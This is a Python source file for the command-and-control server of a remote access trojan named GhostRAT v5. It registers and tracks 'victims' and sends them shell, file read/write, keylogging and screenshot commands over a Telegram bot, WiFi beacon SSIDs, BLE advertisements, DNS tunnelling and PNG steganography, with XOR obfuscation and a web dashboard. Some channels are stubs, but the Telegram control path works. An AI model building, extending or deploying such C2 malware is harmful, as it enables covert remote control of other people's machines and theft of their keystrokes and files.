#!/usr/bin/env python3
"""
GhostRAT v5 — C2 Server
========================

Central command-and-control server for GhostRat v5 implants.

Features:
- Telegram Bot integration (send/receive commands)
- WiFi Beacon command dispatcher
- BLE Advertising command dispatcher
- DNS Tunnel command dispatcher
- PNG Stego command dispatcher
- Victim management (tracking connected implants)
- Command queue and result storage
- Web dashboard (optional)

Usage:
    python c2_server.py --config config.json
    python c2_server.py --telegram --bot-token <token> --chat-id <id>
"""

import argparse
import asyncio
import json
import logging
import os
import sys
import time
import uuid
import hashlib
import base64
import threading
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field, asdict
from enum import Enum

# Try optional dependencies
try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False
    logging.warning("aiohttp not installed. Install with: pip install aiohttp")

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from flask import Flask, render_template, jsonify
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False

# ============================================================
# Logging
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('ghostrat_v5_c2.log', encoding='utf-8')
    ]
)
logger = logging.getLogger('GhostRATv5.C2Server')


# ============================================================
# Command Types
# ============================================================

class ShaderCommand(Enum):
    EXEC = 0x00
    FILE_READ = 0x01
    FILE_WRITE = 0x02
    NETWORK = 0x03
    HEARTBEAT = 0x04
    SHELL = 0x05
    KEYLOG = 0x06
    SCREENSHOT = 0x07
    CRYPTO = 0x10
    DSP = 0x11
    MATRIX = 0x12


# ============================================================
# Data Models
# ============================================================

@dataclass
class Victim:
    """Represents a connected implant/victim."""
    id: str
    name: str = ""
    c2_channel: str = "telegram"
    last_seen: float = 0.0
    first_seen: float = 0.0
    os: str = "Unknown"
    arch: str = "Unknown"
    username: str = ""
    hostname: str = ""
    status: str = "offline"  # online, idle, offline
    commands_sent: int = 0
    commands_received: int = 0
    results_received: int = 0
    tags: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'name': self.name,
            'c2_channel': self.c2_channel,
            'last_seen': datetime.fromtimestamp(self.last_seen, tz=timezone.utc).isoformat() if self.last_seen else None,
            'first_seen': datetime.fromtimestamp(self.first_seen, tz=timezone.utc).isoformat() if self.first_seen else None,
            'os': self.os,
            'arch': self.arch,
            'username': self.username,
            'hostname': self.hostname,
            'status': self.status,
            'commands_sent': self.commands_sent,
            'commands_received': self.commands_received,
            'results_received': self.results_received,
            'tags': self.tags,
            'metadata': self.metadata
        }


@dataclass
class Command:
    """Represents a command to be sent to an implant."""
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    victim_id: str = ""
    command_type: int = 0x04  # Heartbeat by default
    data: bytes = b""
    encrypted: bool = True
    crypto_key: str = "GHOSTRATV5"
    status: str = "pending"  # pending, sent, received, failed
    created_at: float = field(default_factory=time.time)
    sent_at: float = 0.0
    received_at: float = 0.0
    result: bytes = b""
    error: str = ""


@dataclass
class C2Config:
    """C2 server configuration."""
    # Telegram
    telegram_bot_token: str = ""
    telegram_chat_id: int = 0

    # WiFi Beacon
    wifi_ssid_pattern: str = "GHOST-*"
    wifi_channel: int = 6

    # BLE
    ble_adv_pattern: str = "GHOST*"
    ble_adv_channel: int = 37

    # DNS
    dns_domain: str = "ghost.example.com"

    # PNG Stego
    png_stego_url: str = ""

    # General
    poll_interval: int = 5000  # ms
    crypto_key: str = "GHOSTRATV5"
    max_victims: int = 1000


# ============================================================
# XOR Encryption
# ============================================================

def xor_encrypt(data: bytes, key: str) -> bytes:
    """XOR encrypt/decrypt data with a string key."""
    key_bytes = key.encode('utf-8')
    result = bytearray(len(data))

    for i in range(len(data)):
        result[i] = data[i] ^ key_bytes[i % len(key_bytes)]

    return bytes(result)


def xor_decrypt(data: bytes, key: str) -> bytes:
    """XOR decrypt data with a string key (same as encrypt for XOR)."""
    return xor_encrypt(data, key)


# ============================================================
# Telegram C2 Handler
# ============================================================

class TelegramC2Handler:
    """Handles Telegram Bot C2 communication."""

    def __init__(self, token: str, chat_id: int, server: 'C2Server'):
        self.token = token
        self.chat_id = chat_id
        self.server = server
        self.last_update_id = 0
        self.is_running = False
        self.poll_thread = None
        self.api_base = f"https://api.telegram.org/bot{token}"

    def start(self):
        """Start Telegram polling thread."""
        self.is_running = True
        self.poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self.poll_thread.start()
        logger.info(f"Telegram C2 handler started (chat_id: {self.chat_id})")

    def stop(self):
        """Stop Telegram polling thread."""
        self.is_running = False
        if self.poll_thread:
            self.poll_thread.join(timeout=5)

    def _poll_loop(self):
        """Main polling loop."""
        while self.is_running:
            try:
                self._get_updates()
            except Exception as e:
                logger.error(f"Telegram poll error: {e}")
            time.sleep(2)  # Poll every 2 seconds

    def _get_updates(self):
        """Get new updates from Telegram."""
        if not HAS_REQUESTS:
            return

        url = f"{self.api_base}/getUpdates"
        params = {
            'offset': self.last_update_id,
            'timeout': 1,
            'allowed_updates': ['message']
        }

        try:
            response = requests.get(url, params=params, timeout=5)
            data = response.json()

            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    self.last_update_id = update['update_id'] + 1

                    if 'message' in update:
                        message = update['message']
                        text = message.get('text', '').strip()

                        if text.startswith('GHOST '):
                            self._process_command(text)
                        elif text == '/status':
                            self._send_status(message)
                        elif text == '/victims':
                            self._list_victims(message)
                        elif text == '/help':
                            self._send_help(message)
        except Exception as e:
            logger.error(f"Telegram getUpdates error: {e}")

    def _process_command(self, text: str):
        """Process incoming command from Telegram."""
        parts = text[6:].strip().split()  # Remove 'GHOST ' prefix

        if not parts:
            return

        cmd_type = int(parts[0], 16)  # Hex command type

        # Find the victim that sent this command (based on chat_id or other identifier)
        victim = None
        for v_id, v in self.server.victims.items():
            if v.metadata.get('telegram_chat_id') == self.chat_id:
                victim = v
                break

        if not victim:
            logger.warning(f"No victim found for Telegram chat {self.chat_id}")
            return

        # Create command
        data = b""
        if len(parts) > 1:
            data = " ".join(parts[1:]).encode('utf-8')

        command = Command(
            victim_id=victim.id,
            command_type=cmd_type,
            data=data,
            encrypted=True,
            crypto_key=self.server.config.crypto_key
        )

        self.server.queue_command(command)
        logger.info(f"Queued command {command.id} for victim {victim.id}")

    def send_command(self, victim: Victim, command_type: int, data: bytes = b"") -> bool:
        """Send command to victim via Telegram."""
        if not HAS_REQUESTS:
            logger.error("Requests library not available")
            return False

        # Encode command as Telegram message
        cmd_hex = f"{command_type:02X}"
        if data:
            try:
                data_str = data.decode('utf-8')
                cmd_hex += f" {data_str}"
            except UnicodeDecodeError:
                cmd_hex += " " + base64.b64encode(data).decode('utf-8')

        message = f"GHOST {cmd_hex}"

        url = f"{self.api_base}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }

        try:
            response = requests.post(url, json=payload, timeout=10)
            return response.ok
        except Exception as e:
            logger.error(f"Telegram send error: {e}")
            return False

    def send_result(self, victim: Victim, result: str) -> bool:
        """Send result to victim via Telegram."""
        if not HAS_REQUESTS:
            return False

        url = f"{self.api_base}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': f"GHOST\\n{result}",
            'parse_mode': 'HTML'
        }

        try:
            response = requests.post(url, json=payload, timeout=10)
            return response.ok
        except Exception as e:
            logger.error(f"Telegram send error: {e}")
            return False

    def _send_status(self, message: dict):
        """Send server status to Telegram."""
        if not HAS_REQUESTS:
            return

        online_victims = sum(1 for v in self.server.victims.values() if v.status == 'online')
        total_commands = sum(v.commands_sent for v in self.server.victims.values())

        status = (
            f"<b>GhostRAT v5 Status</b>\n"
            f"Online victims: {online_victims}\n"
            f"Total commands sent: {total_commands}\n"
            f"Server uptime: {self.server.get_uptime()}"
        )

        url = f"{self.api_base}/sendMessage"
        requests.post(url, json={
            'chat_id': self.chat_id,
            'text': status,
            'parse_mode': 'HTML'
        })

    def _list_victims(self, message: dict):
        """List victims to Telegram."""
        if not HAS_REQUESTS:
            return

        victims_list = ""
        for v_id, v in self.server.victims.items():
            victims_list += f"<b>{v.name or v_id[:8]}</b> — {v.status} — {v.os} {v.arch}\n"

        if not victims_list:
            victims_list = "No victims registered."

        url = f"{self.api_base}/sendMessage"
        requests.post(url, json={
            'chat_id': self.chat_id,
            'text': f"<b>Victims:</b>\n{victims_list}",
            'parse_mode': 'HTML'
        })

    def _send_help(self, message: dict):
        """Send help message to Telegram."""
        if not HAS_REQUESTS:
            return

        help_text = (
            "<b>GhostRAT v5 Commands</b>\n\n"
            "<b>Heartbeat:</b> <code>GHOST 04</code>\n"
            "<b>Keylog:</b> <code>GHOST 06</code>\n"
            "<b>Screenshot:</b> <code>GHOST 07</code>\n"
            "<b>Shell:</b> <code>GHOST 05 &lt;command&gt;</code>\n"
            "<b>File Read:</b> <code>GHOST 01 &lt;path&gt;</code>\n"
            "<b>File Write:</b> <code>GHOST 02 &lt;path&gt; &lt;data&gt;</code>\n"
            "<b>Exec:</b> <code>GHOST 00 &lt;command&gt;</code>\n\n"
            "<b>Other:</b>\n"
            "<code>/status</code> — Server status\n"
            "<code>/victims</code> — List victims\n"
            "<code>/help</code> — This help message"
        )

        url = f"{self.api_base}/sendMessage"
        requests.post(url, json={
            'chat_id': self.chat_id,
            'text': help_text,
            'parse_mode': 'HTML'
        })


# ============================================================
# WiFi Beacon C2 Handler
# ============================================================

class WifiBeaconC2Handler:
    """Handles WiFi Beacon C2 communication."""

    def __init__(self, config: C2Config, server: 'C2Server'):
        self.config = config
        self.server = server
        self.is_running = False
        self.scan_thread = None

    def start(self):
        """Start WiFi beacon scanning."""
        self.is_running = True
        self.scan_thread = threading.Thread(target=self._scan_loop, daemon=True)
        self.scan_thread.start()
        logger.info("WiFi Beacon C2 handler started")

    def stop(self):
        """Stop WiFi beacon scanning."""
        self.is_running = False
        if self.scan_thread:
            self.scan_thread.join(timeout=5)

    def _scan_loop(self):
        """Main WiFi beacon scanning loop."""
        while self.is_running:
            try:
                # Scan for WiFi beacons matching pattern
                beacons = self._scan_beacons()
                for beacon in beacons:
                    self._process_beacon(beacon)
            except Exception as e:
                logger.error(f"WiFi scan error: {e}")
            time.sleep(self.server.config.poll_interval / 1000)

    def _scan_beacons(self) -> List[Dict]:
        """Scan for WiFi beacons (platform-specific)."""
        # Placeholder: integrate with scapy or similar library
        # For now, return empty list
        return []

    def _process_beacon(self, beacon: Dict):
        """Process received WiFi beacon."""
        ssid = beacon.get('ssid', '')
        if not ssid.startswith('GHOST-'):
            return

        # Decode command from SSID
        hex_data = ssid[6:]  # Remove 'GHOST-' prefix
        try:
            data = bytes.fromhex(hex_data)
            # Decrypt if needed
            if self.server.config.crypto_key:
                data = xor_decrypt(data, self.server.config.crypto_key)

            # Parse command
            cmd_type = data[0] if data else 0x04
            cmd_data = data[1:] if len(data) > 1 else b""

            # Find victim by MAC address
            mac = beacon.get('mac', '')
            victim = self.server.get_victim_by_mac(mac)

            if victim:
                command = Command(
                    victim_id=victim.id,
                    command_type=cmd_type,
                    data=cmd_data,
                    encrypted=True,
                    crypto_key=self.server.config.crypto_key
                )
                self.server.queue_command(command)
                logger.info(f"WiFi beacon command for victim {victim.id}")
        except Exception as e:
            logger.error(f"WiFi beacon decode error: {e}")

    def send_beacon(self, ssid: str) -> bool:
        """Send WiFi beacon with given SSID."""
        # Placeholder: integrate with scapy or similar library
        logger.info(f"WiFi beacon: {ssid}")
        return True


# ============================================================
# BLE Advertising C2 Handler
# ============================================================

class BleAdvC2Handler:
    """Handles BLE Advertising C2 communication."""

    def __init__(self, config: C2Config, server: 'C2Server'):
        self.config = config
        self.server = server
        self.is_running = False
        self.scan_thread = None

    def start(self):
        """Start BLE advertising scanning."""
        self.is_running = True
        self.scan_thread = threading.Thread(target=self._scan_loop, daemon=True)
        self.scan_thread.start()
        logger.info("BLE Advertising C2 handler started")

    def stop(self):
        """Stop BLE advertising scanning."""
        self.is_running = False
        if self.scan_thread:
            self.scan_thread.join(timeout=5)

    def _scan_loop(self):
        """Main BLE scanning loop."""
        while self.is_running:
            try:
                adv_packets = self._scan_adv_packets()
                for packet in adv_packets:
                    self._process_adv_packet(packet)
            except Exception as e:
                logger.error(f"BLE scan error: {e}")
            time.sleep(self.server.config.poll_interval / 1000)

    def _scan_adv_packets(self) -> List[Dict]:
        """Scan for BLE advertising packets."""
        # Placeholder: integrate with bluepy or similar library
        return []

    def _process_adv_packet(self, packet: Dict):
        """Process received BLE advertising packet."""
        data = packet.get('data', b"")
        data_str = data.decode('utf-8', errors='ignore')

        if not data_str.startswith('GHOST'):
            return

        # Decode command from advertising data
        hex_data = data_str[5:]  # Remove 'GHOST' prefix
        try:
            cmd_bytes = bytes.fromhex(hex_data)
            if self.server.config.crypto_key:
                cmd_bytes = xor_decrypt(cmd_bytes, self.server.config.crypto_key)

            cmd_type = cmd_bytes[0] if cmd_bytes else 0x04
            cmd_data = cmd_bytes[1:] if len(cmd_bytes) > 1 else b""

            mac = packet.get('mac', '')
            victim = self.server.get_victim_by_mac(mac)

            if victim:
                command = Command(
                    victim_id=victim.id,
                    command_type=cmd_type,
                    data=cmd_data,
                    encrypted=True,
                    crypto_key=self.server.config.crypto_key
                )
                self.server.queue_command(command)
                logger.info(f"BLE adv command for victim {victim.id}")
        except Exception as e:
            logger.error(f"BLE adv decode error: {e}")


# ============================================================
# DNS Tunnel C2 Handler
# ============================================================

class DnsTunnelC2Handler:
    """Handles DNS Tunnel C2 communication."""

    def __init__(self, config: C2Config, server: 'C2Server'):
        self.config = config
        self.server = server
        self.is_running = False
        self.dns_server_thread = None

    def start(self):
        """Start DNS tunnel server."""
        self.is_running = True
        self.dns_server_thread = threading.Thread(target=self._dns_server_loop, daemon=True)
        self.dns_server_thread.start()
        logger.info(f"DNS Tunnel C2 handler started (domain: {self.config.dns_domain})")

    def stop(self):
        """Stop DNS tunnel server."""
        self.is_running = False
        if self.dns_server_thread:
            self.dns_server_thread.join(timeout=5)

    def _dns_server_loop(self):
        """Main DNS server loop."""
        # Placeholder: integrate with dnspython or similar library
        logger.info("DNS server listening...")
        while self.is_running:
            time.sleep(1)

    def send_dns_response(self, subdomain: str) -> bool:
        """Send DNS response with encoded result."""
        logger.info(f"DNS response: {subdomain}.{self.config.dns_domain}")
        return True


# ============================================================
# PNG Stego C2 Handler
# ============================================================

class PngStegoC2Handler:
    """Handles PNG Stego C2 communication."""

    def __init__(self, config: C2Config, server: 'C2Server'):
        self.config = config
        self.server = server
        self.is_running = False
        self.poll_thread = None

    def start(self):
        """Start PNG stego polling."""
        self.is_running = True
        self.poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self.poll_thread.start()
        logger.info("PNG Stego C2 handler started")

    def stop(self):
        """Stop PNG stego polling."""
        self.is_running = False
        if self.poll_thread:
            self.poll_thread.join(timeout=5)

    def _poll_loop(self):
        """Main PNG stego polling loop."""
        while self.is_running:
            try:
                if self.config.png_stego_url:
                    self._fetch_png()
            except Exception as e:
                logger.error(f"PNG stego fetch error: {e}")
            time.sleep(self.server.config.poll_interval / 1000)

    def _fetch_png(self):
        """Fetch PNG image and decode command from metadata."""
        if not HAS_REQUESTS:
            return

        try:
            response = requests.get(self.config.png_stego_url, timeout=10)
            if response.ok:
                # Parse PNG metadata (tEXt chunks)
                metadata = self._parse_png_metadata(response.content)
                if 'GHOST' in metadata:
                    command_str = metadata['GHOST']
                    # Parse command from string
                    parts = command_str.split(' ', 1)
                    if len(parts) >= 1:
                        cmd_type = int(parts[0], 16)
                        cmd_data = parts[1].encode('utf-8') if len(parts) > 1 else b""

                        command = Command(
                            command_type=cmd_type,
                            data=cmd_data,
                            encrypted=True,
                            crypto_key=self.server.config.crypto_key
                        )
                        self.server.queue_command(command)
                        logger.info(f"PNG stego command received: {cmd_type}")
        except Exception as e:
            logger.error(f"PNG fetch error: {e}")

    def _parse_png_metadata(self, png_data: bytes) -> Dict[str, str]:
        """Parse PNG tEXt chunks for metadata."""
        metadata = {}

        # Simple tEXt chunk parser
        idx = 0
        while idx < len(png_data) - 12:
            # Check for tEXt chunk
            if png_data[idx:idx+4] == b'tEXt':
                # Read chunk length (4 bytes, big-endian)
                chunk_len = int.from_bytes(png_data[idx-4:idx], 'big')
                # Read chunk data
                chunk_data = png_data[idx+4:idx+4+chunk_len]
                try:
                    text = chunk_data.decode('latin-1')
                    if '=' in text:
                        key, value = text.split('=', 1)
                        metadata[key.strip()] = value.strip()
                except UnicodeDecodeError:
                    pass
                idx += 4 + chunk_len + 4  # length + data + CRC
            else:
                idx += 1

        return metadata

    def set_png_metadata(self, key: str, value: str) -> bool:
        """Set PNG metadata for stego encoding."""
        # Placeholder: encode result in PNG image
        logger.info(f"PNG metadata: {key}={value}")
        return True


# ============================================================
# C2 Server
# ============================================================

class C2Server:
    """Main C2 server orchestrating all C2 channels."""

    def __init__(self, config: C2Config):
        self.config = config
        self.victims: Dict[str, Victim] = {}
        self.command_queue: List[Command] = []
        self.command_lock = threading.Lock()
        self.start_time = time.time()
        self.is_running = False

        # C2 handlers
        self.telegram_handler: Optional[TelegramC2Handler] = None
        self.wifi_handler: Optional[WifiBeaconC2Handler] = None
        self.ble_handler: Optional[BleAdvC2Handler] = None
        self.dns_handler: Optional[DnsTunnelC2Handler] = None
        self.png_handler: Optional[PngStegoC2Handler] = None

        # Web dashboard
        self.dashboard: Optional[Flask] = None

        # Start threads
        self.command_processor_thread = None
        self.heartbeat_thread = None

    def start(self):
        """Start the C2 server."""
        self.is_running = True
        logger.info("GhostRAT v5 C2 Server starting...")

        # Initialize C2 handlers
        if self.config.telegram_bot_token and self.config.telegram_chat_id:
            self.telegram_handler = TelegramC2Handler(
                self.config.telegram_bot_token,
                self.config.telegram_chat_id,
                self
            )
            self.telegram_handler.start()

        self.wifi_handler = WifiBeaconC2Handler(self.config, self)
        self.wifi_handler.start()

        self.ble_handler = BleAdvC2Handler(self.config, self)
        self.ble_handler.start()

        self.dns_handler = DnsTunnelC2Handler(self.config, self)
        self.dns_handler.start()

        self.png_handler = PngStegoC2Handler(self.config, self)
        self.png_handler.start()

        # Start command processor
        self.command_processor_thread = threading.Thread(target=self._command_processor_loop, daemon=True)
        self.command_processor_thread.start()

        # Start heartbeat monitor
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_monitor_loop, daemon=True)
        self.heartbeat_thread.start()

        # Start web dashboard
        if HAS_FLASK and getattr(self, 'start_dashboard', True):
            self._start_dashboard()

        logger.info("GhostRAT v5 C2 Server started")

    def stop(self):
        """Stop the C2 server."""
        self.is_running = False

        if self.telegram_handler:
            self.telegram_handler.stop()
        if self.wifi_handler:
            self.wifi_handler.stop()
        if self.ble_handler:
            self.ble_handler.stop()
        if self.dns_handler:
            self.dns_handler.stop()
        if self.png_handler:
            self.png_handler.stop()

        logger.info("GhostRAT v5 C2 Server stopped")

    def register_victim(self, victim_id: str, name: str = "", c2_channel: str = "telegram") -> Victim:
        """Register a new victim/implant."""
        if victim_id in self.victims:
            return self.victims[victim_id]

        victim = Victim(
            id=victim_id,
            name=name or victim_id[:8],
            c2_channel=c2_channel,
            last_seen=time.time(),
            first_seen=time.time(),
            status='online'
        )
        self.victims[victim_id] = victim
        logger.info(f"Victim registered: {victim.name} ({victim_id})")
        return victim

    def get_victim(self, victim_id: str) -> Optional[Victim]:
        """Get victim by ID."""
        return self.victims.get(victim_id)

    def get_victim_by_mac(self, mac: str) -> Optional[Victim]:
        """Get victim by MAC address."""
        for v in self.victims.values():
            if v.metadata.get('mac') == mac:
                return v
        return None

    def queue_command(self, command: Command):
        """Queue a command for processing."""
        with self.command_lock:
            self.command_queue.append(command)
        logger.info(f"Command queued: {command.id} (type: 0x{command.command_type:02X})")

    def send_command_to_victim(self, victim_id: str, command_type: int, data: bytes = b"") -> Optional[Command]:
        """Send a command to a specific victim."""
        victim = self.get_victim(victim_id)
        if not victim:
            logger.error(f"Victim not found: {victim_id}")
            return None

        command = Command(
            victim_id=victim_id,
            command_type=command_type,
            data=data,
            encrypted=True,
            crypto_key=self.config.crypto_key
        )

        self.queue_command(command)
        victim.commands_sent += 1
        return command

    def get_victims(self) -> List[Dict]:
        """Get all victims as dictionaries."""
        return [v.to_dict() for v in self.victims.values()]

    def get_uptime(self) -> str:
        """Get server uptime as human-readable string."""
        uptime = time.time() - self.start_time
        hours, remainder = divmod(int(uptime), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def _command_processor_loop(self):
        """Main command processing loop."""
        while self.is_running:
            try:
                with self.command_lock:
                    if not self.command_queue:
                        time.sleep(0.1)
                        continue

                    command = self.command_queue.pop(0)

                # Process command
                self._process_command(command)
            except Exception as e:
                logger.error(f"Command processor error: {e}")
                time.sleep(1)

    def _process_command(self, command: Command):
        """Process a single command."""
        victim = self.get_victim(command.victim_id)
        if not victim:
            command.status = 'failed'
            command.error = 'Victim not found'
            return

        command.sent_at = time.time()
        command.status = 'sent'

        # Send command via appropriate C2 channel
        success = False
        if victim.c2_channel == 'telegram' and self.telegram_handler:
            success = self.telegram_handler.send_command(victim, command.command_type, command.data)
        elif victim.c2_channel == 'wifi' and self.wifi_handler:
            # Encode command in WiFi beacon SSID
            cmd_bytes = bytes([command.command_type]) + command.data
            if command.encrypted:
                cmd_bytes = xor_encrypt(cmd_bytes, command.crypto_key)
            ssid = f"GHOST-{cmd_bytes.hex()}"
            success = self.wifi_handler.send_beacon(ssid)

        if success:
            command.status = 'received'
            logger.info(f"Command sent to victim {victim.id}: 0x{command.command_type:02X}")
        else:
            command.status = 'failed'
            command.error = 'Failed to send command'
            logger.error(f"Command failed for victim {victim.id}: {command.error}")

    def _heartbeat_monitor_loop(self):
        """Monitor victim heartbeats and update status."""
        while self.is_running:
            try:
                now = time.time()
                for victim_id, victim in self.victims.items():
                    if now - victim.last_seen > 60:  # 60 seconds timeout
                        if victim.status == 'online':
                            victim.status = 'idle'
                            logger.warning(f"Victim {victim.id} marked as idle")
                        if now - victim.last_seen > 300:  # 5 minutes
                            victim.status = 'offline'
                            logger.warning(f"Victim {victim.id} marked as offline")
            except Exception as e:
                logger.error(f"Heartbeat monitor error: {e}")
            time.sleep(10)

    def _start_dashboard(self):
        """Start web dashboard."""
        if not HAS_FLASK:
            return

        self.dashboard = Flask(__name__)

        @self.dashboard.route('/')
        def index():
            return render_template('index.html')

        @self.dashboard.route('/api/victims')
        def api_victims():
            return jsonify(self.get_victims())

        @self.dashboard.route('/api/commands')
        def api_commands():
            with self.command_lock:
                return jsonify([asdict(c) for c in self.command_queue])

        @self.dashboard.route('/api/send_command', methods=['POST'])
        def api_send_command():
            data = request.get_json()
            victim_id = data.get('victim_id')
            command_type = data.get('command_type', 0x04)
            command_data = bytes.fromhex(data.get('data', '')) if data.get('data') else b""

            command = self.send_command_to_victim(victim_id, command_type, command_data)
            if command:
                return jsonify({'status': 'queued', 'command_id': command.id})
            return jsonify({'status': 'error', 'message': 'Victim not found'}), 404

        from flask import request
        self.dashboard.run(host='0.0.0.0', port=5000, debug=False)


# ============================================================
# CLI Entry Point
# ============================================================

def main():
    parser = argparse.ArgumentParser(description='GhostRAT v5 C2 Server')
    parser.add_argument('--config', type=str, help='Path to config file')
    parser.add_argument('--telegram', action='store_true', help='Enable Telegram C2')
    parser.add_argument('--bot-token', type=str, help='Telegram bot token')
    parser.add_argument('--chat-id', type=int, help='Telegram chat ID')
    parser.add_argument('--dns-domain', type=str, help='DNS domain for tunnel')
    parser.add_argument('--png-url', type=str, help='PNG stego URL')
    parser.add_argument('--crypto-key', type=str, help='XOR encryption key')
    parser.add_argument('--poll-interval', type=int, help='Poll interval in ms')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')

    args = parser.parse_args()

    # Load config
    config = C2Config()

    if args.config:
        with open(args.config, 'r') as f:
            config_data = json.load(f)
            for key, value in config_data.items():
                if hasattr(config, key):
                    setattr(config, key, value)

    if args.telegram:
        config.telegram_bot_token = args.bot_token or config.telegram_bot_token
        config.telegram_chat_id = args.chat_id or config.telegram_chat_id

    if args.dns_domain:
        config.dns_domain = args.dns_domain

    if args.png_url:
        config.png_stego_url = args.png_url

    if args.crypto_key:
        config.crypto_key = args.crypto_key

    if args.poll_interval:
        config.poll_interval = args.poll_interval

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    # Create and start server
    server = C2Server(config)
    server.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        server.stop()


if __name__ == '__main__':
    main()
